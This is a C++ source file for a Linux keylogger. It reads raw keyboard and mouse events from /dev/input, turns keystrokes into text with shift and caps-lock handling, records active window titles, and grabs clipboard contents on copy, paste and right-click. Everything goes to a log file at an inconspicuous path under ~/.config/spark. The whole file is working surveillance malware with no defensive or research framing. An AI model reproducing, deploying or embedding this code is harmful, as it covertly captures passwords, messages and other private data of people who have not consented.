#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>
#include <map>
#include <cstdlib>

using namespace std;

// Key and Mouse Button Maps
std::map<int, std::string> mouseKeyMap = {
    {BTN_LEFT, "[LBUTTON]"},
    {BTN_RIGHT, "[RBUTTON]"}
};

std::map<int, std::string> keyMap = {
    {KEY_A, "a"}, {KEY_B, "b"}, {KEY_C, "c"}, {KEY_D, "d"},
    {KEY_E, "e"}, {KEY_F, "f"}, {KEY_G, "g"}, {KEY_H, "h"},
    {KEY_I, "i"}, {KEY_J, "j"}, {KEY_K, "k"}, {KEY_L, "l"},
    {KEY_M, "m"}, {KEY_N, "n"}, {KEY_O, "o"}, {KEY_P, "p"},
    {KEY_Q, "q"}, {KEY_R, "r"}, {KEY_S, "s"}, {KEY_T, "t"},
    {KEY_U, "u"}, {KEY_V, "v"}, {KEY_W, "w"}, {KEY_X, "x"},
    {KEY_Y, "y"}, {KEY_Z, "z"},

    {KEY_1, "1"}, {KEY_2, "2"}, {KEY_3, "3"}, {KEY_4, "4"},
    {KEY_5, "5"}, {KEY_6, "6"}, {KEY_7, "7"}, {KEY_8, "8"},
    {KEY_9, "9"}, {KEY_0, "0"},

    {KEY_MINUS, "-"}, {KEY_EQUAL, "="},
    {KEY_LEFTBRACE, "["}, {KEY_RIGHTBRACE, "]"},
    {KEY_BACKSLASH, "\\"}, {KEY_SEMICOLON, ";"}, {KEY_APOSTROPHE, "'"},
    {KEY_GRAVE, "`"}, {KEY_COMMA, ","}, {KEY_DOT, "."}, {KEY_SLASH, "/"},

    {KEY_SPACE, " "}, {KEY_ENTER, "\n"},
    {KEY_BACKSPACE, "[BACKSPACE]"}, {KEY_TAB, "\t"},
    {KEY_ESC, "[ESC]"},

    // Function keys
    {KEY_F1, "[F1]"}, {KEY_F2, "[F2]"}, {KEY_F3, "[F3]"}, {KEY_F4, "[F4]"},
    {KEY_F5, "[F5]"}, {KEY_F6, "[F6]"}, {KEY_F7, "[F7]"}, {KEY_F8, "[F8]"},
    {KEY_F9, "[F9]"}, {KEY_F10, "[F10]"}, {KEY_F11, "[F11]"}, {KEY_F12, "[F12]"},

    // Control keys
    {KEY_LEFTSHIFT, "[SHIFT]"}, {KEY_RIGHTSHIFT, "[SHIFT]"},
    {KEY_LEFTCTRL, "[CTRL]"}, {KEY_RIGHTCTRL, "[CTRL]"},
    {KEY_LEFTALT, "[ALT]"}, {KEY_RIGHTALT, "[ALT]"},
    {KEY_CAPSLOCK, "[CAPSLOCK]"},

    // Arrow keys
    {KEY_UP, "[UP]"}, {KEY_DOWN, "[DOWN]"}, {KEY_LEFT, "[LEFT]"}, {KEY_RIGHT, "[RIGHT]"},

    // Keypad keys
    {KEY_KP0, "0"}, {KEY_KP1, "1"}, {KEY_KP2, "2"}, {KEY_KP3, "3"},
    {KEY_KP4, "4"}, {KEY_KP5, "5"}, {KEY_KP6, "6"}, {KEY_KP7, "7"},
    {KEY_KP8, "8"}, {KEY_KP9, "9"},
    {KEY_KPDOT, "."}, {KEY_KPSLASH, "/"}, {KEY_KPASTERISK, "*"},
    {KEY_KPMINUS, "-"}, {KEY_KPPLUS, "+"}, {KEY_KPENTER, "\n"}
};

std::map<int, std::string> shiftKeyMap = {
    {KEY_1, "!"}, {KEY_2, "@"}, {KEY_3, "#"}, {KEY_4, "$"},
    {KEY_5, "%"}, {KEY_6, "^"}, {KEY_7, "&"}, {KEY_8, "*"},
    {KEY_9, "("}, {KEY_0, ")"},

    {KEY_MINUS, "_"}, {KEY_EQUAL, "+"},
    {KEY_LEFTBRACE, "{"}, {KEY_RIGHTBRACE, "}"},
    {KEY_BACKSLASH, "|"}, {KEY_SEMICOLON, ":"}, {KEY_APOSTROPHE, "\""},
    {KEY_GRAVE, "~"}, {KEY_COMMA, "<"}, {KEY_DOT, ">"}, {KEY_SLASH, "?"},
};

// Function to get the log file path from command-line arguments or default to the user's home directory
string getLogFilePath(int argc, char* argv[]) {
    if (argc > 1) {
        return string(argv[1]) + "/.config/spark/log.txt"; // Use provided path
    }
    const char* homeDir = getenv("HOME");
    if (!homeDir) {
        cerr << "Error: HOME environment variable not set and no log file path provided. Exiting." << endl;
        exit(1);
    }
    return string(homeDir) + "/.config/spark/log.txt"; // Default path
}

// Function to get the active window name
string getActiveWindowName() {
    char buffer[128];
    string result = "Unknown Window";
    FILE* pipe = popen("xdotool getactivewindow getwindowname", "r");
    if (pipe) {
        if (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
            result = string(buffer);
            result.erase(result.find_last_not_of(" \n\r\t") + 1); // Trim trailing whitespace
        }
        pclose(pipe);
    }
    return result;
}

// Function to get the clipboard content
string getClipboardContent() {
    char buffer[128];
    string result = "";
    FILE* pipe = popen("xclip -o -selection clipboard", "r"); // Use xclip to get clipboard content
    if (pipe) {
        while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
            result += buffer;
        }
        pclose(pipe);
    }
    return result;
}

int main(int argc, char* argv[]) {
    // Get the log file path
    string logFilePath = getLogFilePath(argc, argv);

    vector<int> keyboard_fds; // To store multiple keyboard file descriptors
    vector<int> mouse_fds;    // To store multiple mouse file descriptors
    bool ctrlPressed = false; // Track CTRL key state
    bool shiftPressed = false; // Track SHIFT key state
    bool capsLockActive = false; // Track CAPSLOCK state

    string lastClipboardContent = ""; // Track the last logged clipboard content
    string lastActiveWindow = ""; // Track the last active window



    // Open log file
    ofstream logFile(logFilePath, ios::app);
    if (!logFile.is_open()) {
        cerr << "Failed to open log file: " << logFilePath << endl;
        return 1;
    }

    // Find keyboard and mouse devices
    for (int i = 0; i < 32; i++) {
        string devicePath = "/dev/input/event" + to_string(i);
        int fd = open(devicePath.c_str(), O_RDONLY | O_NONBLOCK);
        if (fd != -1) {
            char name[256];
            ioctl(fd, EVIOCGNAME(sizeof(name)), name);
            string deviceName(name);
            if (deviceName.find("keyboard") != string::npos) {
                keyboard_fds.push_back(fd); // Add keyboard device to the list
                cout << "Keyboard device found: " << devicePath << endl;
            } else if (deviceName.find("mouse") != string::npos || deviceName.find("Mouse") != string::npos) {
                mouse_fds.push_back(fd); // Add mouse device to the list
                cout << "Mouse device found: " << devicePath << endl;
            } else {
                close(fd);
            }
        }
    }

    if (keyboard_fds.empty() && mouse_fds.empty()) {
        cerr << "No keyboard or mouse device found." << endl;
        return 1;
    }

    struct input_event event;
    while (true) {
        // Log active window changes
        
        string currentActiveWindow = getActiveWindowName();
        if (currentActiveWindow != lastActiveWindow) {
            lastActiveWindow = currentActiveWindow;
            cout << endl << "[WINDOW CHANGED]: " << currentActiveWindow << endl << endl;
            logFile << endl << "[WINDOW CHANGED]: " << currentActiveWindow << endl << endl;
            logFile.flush();
        }
        // Process keyboard events from all detected keyboard devices
        for (int keyboard_fd : keyboard_fds) {
            if (read(keyboard_fd, &event, sizeof(event)) > 0) {
                if (event.type == EV_KEY) {
                    if (event.value == 1) { // Key press
                        if (event.code == KEY_LEFTCTRL || event.code == KEY_RIGHTCTRL) {
                            ctrlPressed = true;
                        } else if (event.code == KEY_LEFTSHIFT || event.code == KEY_RIGHTSHIFT) {
                            shiftPressed = true;
                        } else if (event.code == KEY_CAPSLOCK) {
                            capsLockActive = !capsLockActive; // Toggle CAPSLOCK state
                        } else if (ctrlPressed && event.code == KEY_C) { // Detect CTRL+C (copy)
                            string clipboardContent = getClipboardContent();
                            if (!clipboardContent.empty()) {
                                cout << endl << "[COPY from " << currentActiveWindow << "]: [" << clipboardContent << "]" << endl;
                                logFile << endl << "[COPY from " << currentActiveWindow << "]: [" << clipboardContent << "]" << endl;
                                logFile.flush();
                            }                       
                        } else if (ctrlPressed && event.code == KEY_V) { // Detect CTRL+V (Paste)
                            string clipboardContent = getClipboardContent();
                            if (!clipboardContent.empty() && clipboardContent != lastClipboardContent) {
                                lastClipboardContent = clipboardContent;
                                cout << endl << "[PASTE TO " << currentActiveWindow << "]: " << clipboardContent << endl;
                                logFile << endl << "[PASTE TO " << currentActiveWindow << "]: [" << clipboardContent << "]" << endl;
                                logFile.flush();
                            }
                        } else {                            
                            auto it = keyMap.find(event.code);
                            if (it != keyMap.end()) {
                                string outputKey = it->second;
                                if (shiftPressed) {
                                    if (shiftKeyMap.find(event.code) != shiftKeyMap.end()) {
                                        outputKey = shiftKeyMap[event.code];
                                    } else {
                                        outputKey[0] = toupper(outputKey[0]);
                                    }
                                } else if (capsLockActive && isalpha(outputKey[0])) {
                                    outputKey[0] = toupper(outputKey[0]);
                                }
                                cout << outputKey;  // Output to console
                                logFile << outputKey;
                                logFile.flush();
                            }
                        }
                    } else if (event.value == 0) { // Key release
                        if (event.code == KEY_LEFTCTRL || event.code == KEY_RIGHTCTRL) {
                            ctrlPressed = false;
                        } else if (event.code == KEY_LEFTSHIFT || event.code == KEY_RIGHTSHIFT) {
                            shiftPressed = false;
                        }
                    }
                }
            }
        }

        // Process mouse events from all detected mouse devices
        for (int mouse_fd : mouse_fds) {
            if (read(mouse_fd, &event, sizeof(event)) > 0) {
                if (event.type == EV_KEY && event.value == 1) { // Mouse button press
                    if (event.code == BTN_RIGHT) { // Right-click triggers clipboard check
                        string clipboardContent = getClipboardContent();
                        // logFile << "[Test]" << BTN_RIGHT << " " << event.code << " " << clipboardContent;
                        if (!clipboardContent.empty()) {
                            // lastClipboardContent = clipboardContent;
                            cout << "[RIGHT-CLICK COPY from " << currentActiveWindow << "]: " << clipboardContent << endl;
                            logFile << "[RIGHT-CLICK COPY from " << currentActiveWindow << "]: " << clipboardContent << endl;
                            logFile.flush();
                        }
                    }
                    auto it = mouseKeyMap.find(event.code);
                    if (it != mouseKeyMap.end()) {
                        cout << it->second << endl;  // Output to console
                        logFile << it->second << endl; // Log mouse click
                        logFile.flush();
                    }
                }
            }
        }

        usleep(1000); // Prevent CPU overuse
    }
       

    // Close devices
    for (int keyboard_fd : keyboard_fds) {
        close(keyboard_fd);
    }
    for (int mouse_fd : mouse_fds) {
        close(mouse_fd);
    }
    logFile.close();
    return 0;
}
